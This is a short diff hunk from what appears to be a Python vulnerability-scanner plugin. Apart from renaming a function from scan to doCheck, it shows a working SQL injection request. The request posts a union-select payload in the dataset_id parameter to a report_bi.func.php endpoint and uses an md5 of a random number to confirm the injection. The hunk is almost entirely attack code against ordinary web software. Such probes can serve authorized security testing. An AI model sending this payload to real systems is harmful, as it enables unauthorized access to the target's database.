@@ -6,7 +6,7 @@ def randomInt(s,e):
 	key=random.randint(int(s),int(e))
 	return key
 f1=randomInt(40000, 44800)
-def scan(baseurl):
+def doCheck(baseurl):
 	url=baseurl+"general/bi_design/appcenter/report_bi.func.php"
 	body=f"_POST[dataset_id]=efgh'-@`'`)union+select+1,2,md5({f1})#'&action=get_link_info"
 	headers={'Content-Type': 'application/x-www-form-urlencoded'}
